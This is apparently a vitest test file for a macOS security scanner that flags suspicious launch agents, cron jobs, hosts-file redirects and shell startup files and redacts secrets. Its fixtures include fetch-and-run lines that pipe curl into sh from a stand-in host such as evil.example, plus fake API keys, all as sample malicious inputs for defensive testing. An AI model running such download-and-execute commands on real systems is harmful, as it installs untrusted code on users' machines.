import { describe, it, expect } from 'vitest';
import {
  analyzeMac, runMacSecurityScan, parseCodesign, parseMacSections,
  type CollectDeps, type MacFacts,
} from '../src/main/mac-security-scan';

const HOME = '/Users/amy';
const base = (over: Partial<MacFacts>): MacFacts => ({
  entries: [], signatures: {}, missing: new Set(), notes: [], sections: ['autoruns', 'system'], ...over,
});
const dev = { status: 'signed' as const, signer: 'Developer ID Application: Dropbox, Inc. (G7HH3F8CAK)' };

describe('analyzeMac', () => {
  it('a signed app in /Applications is trusted, not reported', () => {
    const r = analyzeMac(base({
      entries: [{ source: 'LaunchAgent', location: `${HOME}/Library/LaunchAgents/com.dropbox.plist`, name: 'com.dropbox.agent', program: '/Applications/Dropbox.app/Contents/MacOS/Dropbox' }],
      signatures: { '/Applications/Dropbox.app/Contents/MacOS/Dropbox': dev },
    }), HOME);
    expect(r.findings).toEqual([]);
    expect(r.summary.trusted).toBe(1);
    expect(r.verdict).toMatch(/^No warning signs/);
  });

  it('flags a job that starts from /tmp as high', () => {
    const r = analyzeMac(base({
      entries: [{ source: 'LaunchAgent', location: `${HOME}/Library/LaunchAgents/x.plist`, name: 'x', program: '/private/tmp/.x/payload' }],
    }), HOME);
    expect(r.findings[0].severity).toBe('high');
    expect(r.findings[0].signals.map((s) => s.code)).toContain('unusual_location');
    expect(r.verdict).toMatch(/need a closer look/);
  });

  it('flags Apple-looking labels installed outside /System', () => {
    const r = analyzeMac(base({
      entries: [{ source: 'LaunchDaemon', location: '/Library/LaunchDaemons/com.apple.update.plist', name: 'com.apple.update', program: '/Library/Application Support/x/helper' }],
      signatures: { '/Library/Application Support/x/helper': { status: 'unsigned' } },
    }), HOME);
    expect(r.findings[0].severity).toBe('high');
    expect(r.findings[0].title).toMatch(/part of macOS/);
  });

  it('flags curl|sh launchers (high) and inline interpreters (medium)', () => {
    const r = analyzeMac(base({
      entries: [
        { source: 'LaunchAgent', location: `${HOME}/Library/LaunchAgents/a.plist`, name: 'a', program: '/bin/sh', args: ['-c', 'curl -s http://evil.example/x | sh'] },
        { source: 'LaunchAgent', location: `${HOME}/Library/LaunchAgents/b.plist`, name: 'b', program: '/usr/bin/python3', args: ['-c', 'import os'] },
      ],
    }), HOME);
    const bySev = Object.fromEntries(r.findings.map((f) => [f.name, f.severity]));
    expect(bySev).toEqual({ a: 'high', b: 'medium' });
  });

  it('unsigned program outside the usual folders is medium; missing target is low', () => {
    const r = analyzeMac(base({
      entries: [
        { source: 'LaunchAgent', location: `${HOME}/Library/LaunchAgents/u.plist`, name: 'u', program: `${HOME}/bin/tool` },
        { source: 'LaunchAgent', location: `${HOME}/Library/LaunchAgents/m.plist`, name: 'm', program: '/Applications/Gone.app/x' },
      ],
      signatures: { [`${HOME}/bin/tool`]: { status: 'unsigned' } },
      missing: new Set(['/Applications/Gone.app/x']),
    }), HOME);
    expect(r.findings.map((f) => [f.name, f.severity])).toEqual([['u', 'medium'], ['m', 'low']]);
  });

  it('reads /etc/hosts: default is clean, a redirect is medium, a block is low', () => {
    const clean = analyzeMac(base({ hosts: '127.0.0.1 localhost\n255.255.255.255 broadcasthost\n::1 localhost\n# x\n' }), HOME);
    expect(clean.findings).toEqual([]);
    const r = analyzeMac(base({ hosts: '127.0.0.1 localhost\n6.6.6.6 www.icloud.com\n0.0.0.0 ads.example.com\n' }), HOME);
    expect(r.findings.map((f) => f.severity)).toEqual(['medium', 'low']);
  });

  it('flags shell startup files that pipe a download into a shell, ignores comments', () => {
    const r = analyzeMac(base({ rcFiles: [
      { file: `${HOME}/.zshrc`, text: '# curl http://a | sh\nexport PATH=$PATH:~/bin\n' },
      { file: `${HOME}/.zprofile`, text: 'curl -fsSL https://x.example/i.sh | bash\n' },
    ] }), HOME);
    expect(r.findings).toHaveLength(1);
    expect(r.findings[0]).toMatchObject({ severity: 'high', name: '.zprofile', source: 'ShellStartup' });
  });

  it('reports configuration profiles and caps findings with a note', () => {
    const r = analyzeMac(base({ profiles: 'profileIdentifier: com.corp.mdm\nprofileIdentifier: com.corp.wifi\n' }), HOME);
    expect(r.findings[0].title).toMatch(/2 configuration profile/);
    const many = analyzeMac(base({
      entries: Array.from({ length: 5 }, (_, i) => ({ source: 'LaunchAgent' as const, location: `${HOME}/Library/LaunchAgents/${i}.plist`, name: `n${i}`, program: `/tmp/${i}` })),
    }), HOME, 2);
    expect(many.findings).toHaveLength(2);
    expect(many.notes.join(' ')).toMatch(/Showing 2 of 5/);
  });

  it('uses Mac wording and the Windows result shape', () => {
    const r = analyzeMac(base({}), HOME);
    expect(r).toMatchObject({ ok: true, readOnly: true, platform: 'macOS' });
    expect(Object.keys(r.summary).sort()).toEqual(['checked', 'high', 'low', 'medium', 'trusted']);
    expect(JSON.stringify(r)).not.toMatch(/\bPC\b|Defender|Windows/);
  });
});

describe('parseCodesign / parseMacSections', () => {
  it('reads authorities', () => {
    const t = 'Executable=/x\nAuthority=Developer ID Application: Foo (ABC)\nAuthority=Developer ID Certification Authority\nAuthority=Apple Root CA\n';
    expect(parseCodesign(t)).toMatchObject({ status: 'signed', signer: 'Developer ID Application: Foo (ABC)', apple: true });
    expect(parseCodesign('x: code object is not signed at all')).toEqual({ status: 'unsigned' });
  });
  it('maps Windows section names, defaulting to autoruns+system', () => {
    expect(parseMacSections('autoruns,tasks,services,processes,system,defender')).toEqual(['autoruns', 'tasks', 'services', 'processes', 'system']);
    expect(parseMacSections('defender')).toEqual(['autoruns', 'system']);
  });
});

describe('collectMac with a fake system (read-only, execFile args only)', () => {
  const calls: Array<[string, string[]]> = [];
  const files: Record<string, string> = {
    '/etc/hosts': '127.0.0.1 localhost\n',
    [`${HOME}/.zshrc`]: 'alias ll="ls -l"\n',
  };
  const plist: Record<string, unknown> = {
    [`${HOME}/Library/LaunchAgents/bad.plist`]: { Label: 'bad', ProgramArguments: ['/tmp/evil', '--x'], RunAtLoad: true },
    '/Library/LaunchDaemons/ok.plist': { Label: 'ok.daemon', Program: '/Applications/Ok.app/Contents/MacOS/ok' },
  };
  const dirs: Record<string, string[]> = {
    [`${HOME}/Library/LaunchAgents`]: ['bad.plist', 'notes.txt'],
    '/Library/LaunchDaemons': ['ok.plist'],
    '/System/Library/LaunchAgents': ['a.plist', 'b.plist'],
    '/System/Library/LaunchDaemons': ['c.plist'],
  };
  const deps: CollectDeps = {
    home: HOME,
    async run(cmd, args) {
      calls.push([cmd, args]);
      if (cmd === '/usr/bin/plutil') return { stdout: JSON.stringify(plist[args[args.length - 1]]), stderr: '' };
      if (cmd === '/usr/bin/codesign') {
        if (args[args.length - 1].startsWith('/tmp')) throw Object.assign(new Error('x'), { stderr: 'code object is not signed at all' });
        return { stdout: '', stderr: 'Authority=Developer ID Application: Ok (XYZ)\nAuthority=Apple Root CA\n' };
      }
      if (cmd === '/usr/bin/osascript') return { stdout: 'Dropbox, Slack', stderr: '' };
      if (cmd === '/usr/bin/crontab') throw Object.assign(new Error('no crontab'), { stderr: 'crontab: no crontab for amy' });
      if (cmd === '/usr/bin/profiles') throw new Error('needs admin');
      if (cmd === '/bin/ps') return { stdout: '  1 /sbin/launchd\n 99 /private/tmp/x/miner\n', stderr: '' };
      throw new Error('unexpected ' + cmd);
    },
    readdir: (d) => dirs[d] ?? [],
    readFile: (f) => files[f] ?? null,
    exists: (p) => p !== '/tmp/evil',
  };

  it('runs the full scan and finds the planted agent and process', async () => {
    const r = await runMacSecurityScan(['autoruns', 'tasks', 'services', 'processes', 'system'], deps);
    const names = r.findings.map((f) => f.name);
    expect(names).toContain('bad');
    expect(names).toContain('miner');
    expect(names).not.toContain('ok.daemon');
    expect(r.summary.trusted).toBeGreaterThanOrEqual(1);
    expect(r.notes.join(' ')).toMatch(/Configuration profiles could not be listed/);
    expect(r.notes.join(' ')).toMatch(/2 launch agents and 1 launch daemons/);
  });

  it('only ever runs the allowed read-only commands, never through a shell or sudo', () => {
    const allowed = new Set(['/usr/bin/plutil', '/usr/bin/codesign', '/usr/bin/osascript', '/usr/bin/crontab', '/usr/bin/profiles', '/bin/ps']);
    expect(calls.length).toBeGreaterThan(0);
    for (const [cmd] of calls) expect(allowed.has(cmd)).toBe(true);
    expect(calls.find(([c]) => c === '/usr/bin/crontab')![1]).toEqual(['-l']);
  });
});

import { redactCommand, cronProgramName } from '../src/main/mac-security-scan';

describe('secrets never leave the scanner', () => {
  const SECRETS = [
    'hunter2pw', 'sk-live-ABCDEF1234567890abcdef', 'AKIAABCDEFGHIJKLMNOP', 'ghp_abcdefghijklmnop1234',
    'tokenvalue123456', 'q=secretquery', 'Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MDEyMw', 'user:pw123@',
  ];
  const text = (v: unknown) => JSON.stringify(v);

  it('redactCommand strips userinfo, queries, headers, assignments and long tokens', () => {
    const out = redactCommand(
      'curl -H "Authorization: Bearer sk-live-ABCDEF1234567890abcdef" https://user:pw123@host.example/p?q=secretquery#frag ' +
      '--token tokenvalue123456 API_KEY=hunter2pw AWS=AKIAABCDEFGHIJKLMNOP Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MDEyMw | sh');
    for (const s of SECRETS) expect(out).not.toContain(s);
    expect(out).toContain('host.example/p');
    expect(out).toContain('| sh');
  });

  it('does not mangle ordinary long paths', () => {
    const p = '/Applications/Some Long Application Name.app/Contents/MacOS/helper-tool-with-long-name';
    expect(redactCommand(p)).toBe(p);
  });

  it('cron: informational lines report only the program, never the arguments', () => {
    const line = '*/5 * * * * API_KEY=hunter2pw /Users/amy/bin/backup.sh --token tokenvalue123456 https://u:pw123@h.example/x?q=secretquery';
    expect(cronProgramName(line)).toBe('backup.sh');
    const r = analyzeMac(base({ entries: [{ source: 'Cron', location: 'crontab', name: cronProgramName(line), args: [line] }] }), HOME);
    expect(r.findings[0].severity).toBe('low');
    for (const s of SECRETS) expect(text(r)).not.toContain(s);
  });

  it('cron: a curl|sh line is high and quoted only redacted', () => {
    const line = '@reboot curl -s https://u:pw123@h.example/i.sh?q=secretquery -H "Authorization: Bearer sk-live-ABCDEF1234567890abcdef" | sh';
    const r = analyzeMac(base({ entries: [{ source: 'Cron', location: 'crontab', name: cronProgramName(line), args: [line] }] }), HOME);
    expect(r.findings[0].severity).toBe('high');
    expect(text(r)).toContain('h.example/i.sh');
    for (const s of SECRETS) expect(text(r)).not.toContain(s);
  });

  it('launcher args: inline commands are not quoted; curl|sh is quoted redacted', () => {
    const r = analyzeMac(base({ entries: [
      { source: 'LaunchAgent', location: HOME + '/Library/LaunchAgents/a.plist', name: 'a', program: '/bin/sh', args: ['-c', 'echo hunter2pw; API_KEY=hunter2pw run'] },
      { source: 'LaunchAgent', location: HOME + '/Library/LaunchAgents/b.plist', name: 'b', program: '/bin/sh', args: ['-c', 'curl https://user:pw123@h.example/x?q=secretquery | sh'] },
    ] }), HOME);
    expect(r.findings.map((f) => f.severity).sort()).toEqual(['high', 'medium']);
    for (const s of SECRETS) expect(text(r)).not.toContain(s);
  });

  it('shell startup lines are redacted when quoted', () => {
    const r = analyzeMac(base({ rcFiles: [{ file: HOME + '/.zshrc', text: 'curl -fsSL https://user:pw123@h.example/i.sh?q=secretquery -H "Authorization: Bearer sk-live-ABCDEF1234567890abcdef" | bash\n' }] }), HOME);
    expect(r.findings).toHaveLength(1);
    for (const s of SECRETS) expect(text(r)).not.toContain(s);
  });
});
